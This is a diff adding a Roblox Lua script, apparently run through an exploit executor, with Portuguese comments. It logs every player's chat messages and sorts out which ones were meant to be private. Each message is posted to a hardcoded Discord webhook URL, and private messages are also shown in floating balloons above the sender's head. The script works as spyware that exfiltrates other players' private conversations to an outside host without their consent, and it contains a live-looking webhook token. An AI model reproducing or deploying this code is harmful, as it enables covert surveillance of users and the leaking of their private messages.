@@ -1,0 +1,166 @@
+local request = (syn and syn.request) or request or http_request
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+local webhookURL = "https://discord.com/api/webhooks/1330262990041124895/wL1EwTYqHdQwz_Eyi4XqCZLAqyfv1O8W7rvQLQUNO0s7aKxl3KkyhKPxWrIJ3hBTXUXl"
+
+local serverMessages = {}
+local clientMessages = {}
+local sentMessages = {}
+
+-- Função para criar balão de chat acima do jogador
+local function createChatBalloon(player, message)
+    if not player or not player.Character then return end
+    
+    local head = player.Character:FindFirstChild("Head")
+    if not head then return end
+    
+    -- Cria um BillboardGui para o balão de chat
+    local balloonGui = Instance.new("BillboardGui")
+    balloonGui.Adornee = head
+    balloonGui.Name = "PrivateChatBalloon"
+    balloonGui.Size = UDim2.new(4, 0, 2, 0)
+    balloonGui.StudsOffset = Vector3.new(0, 3, 0)
+    balloonGui.AlwaysOnTop = true
+    balloonGui.LightInfluence = 1
+    balloonGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    local frame = Instance.new("Frame")
+    frame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    frame.BackgroundTransparency = 0.3
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.Position = UDim2.new(0, 0, 0, 0)
+    frame.BorderSizePixel = 0
+    frame.ZIndex = 1
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0.2, 0)
+    corner.Parent = frame
+    
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Text = message
+    textLabel.TextColor3 = Color3.fromRGB(100, 150, 255) -- Azul bebê forte
+    textLabel.TextScaled = true
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.BackgroundTransparency = 1
+    textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
+    textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
+    textLabel.ZIndex = 2
+    
+    frame.Parent = balloonGui
+    textLabel.Parent = frame
+    balloonGui.Parent = head
+    
+    -- Remove o balão após alguns segundos
+    delay(5, function()
+        if balloonGui then
+            balloonGui:Destroy()
+        end
+    end)
+end
+
+local function sendToDiscord(username, displayName, message, isPublic)
+    local messageId = username .. ":" .. message
+    if sentMessages[messageId] then return end
+    sentMessages[messageId] = true
+
+    local emoji = isPublic and "🌐" or "🔒"
+    local data = {
+        ["content"] = string.format("%s **%s (@%s)**: %s", emoji, displayName, username, message),
+        ["username"] = "Roblox Chat Logger (AWP)"
+    }
+
+    -- Se for mensagem privada, cria o balão de chat
+    if not isPublic then
+        local player = Players:FindFirstChild(username)
+        if player then
+            createChatBalloon(player, message)
+        end
+    end
+
+    local success, err = pcall(function()
+        request({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+
+    if not success then
+        warn("Erro ao enviar para o Discord: " .. err)
+    end
+end
+
+local function decideMessageType(username, displayName, message)
+    task.delay(0.5, function()
+        local key = username .. ":" .. message
+        local isPublic = clientMessages[key] == true
+        sendToDiscord(username, displayName, message, isPublic)
+    end)
+end
+
+local function handleServerMessage(player, message)
+    local key = player.Name .. ":" .. message
+    serverMessages[key] = true
+    decideMessageType(player.Name, player.DisplayName, message)
+end
+
+local function handleClientMessage(username, displayName, message)
+    local key = username .. ":" .. message
+    clientMessages[key] = true
+end
+
+-- Conexão de mensagens do servidor
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        handleServerMessage(player, message)
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        handleServerMessage(player, message)
+    end)
+end)
+
+-- Processamento de mensagens do cliente
+local function processClientMessage(message)
+    local text = message.Text
+    local username = "Unknown"
+    local displayName = "Unknown"
+
+    if message.TextSource then
+        local player = Players:GetPlayerByUserId(message.TextSource.UserId)
+        if player then
+            username = player.Name
+            displayName = player.DisplayName
+        elseif message.TextSource.Name then
+            username = message.TextSource.Name
+            displayName = message.TextSource.Name
+        end
+    end
+
+    handleClientMessage(username, displayName, text)
+end
+
+-- Inicialização do sistema de chat
+if TextChatService then
+    local chatWindow = TextChatService.TextChannels.RBXGeneral
+    if chatWindow then
+        chatWindow.MessageReceived:Connect(processClientMessage)
+    else
+        warn("Canal de chat RBXGeneral não encontrado!")
+    end
+else
+    LocalPlayer.Chatted:Connect(function(message)
+        handleClientMessage(LocalPlayer.Name, LocalPlayer.DisplayName, message)
+    end)
+end
+
+print("✅ Chat Logger com Display Name e balões de chat privado ativado com sucesso!")
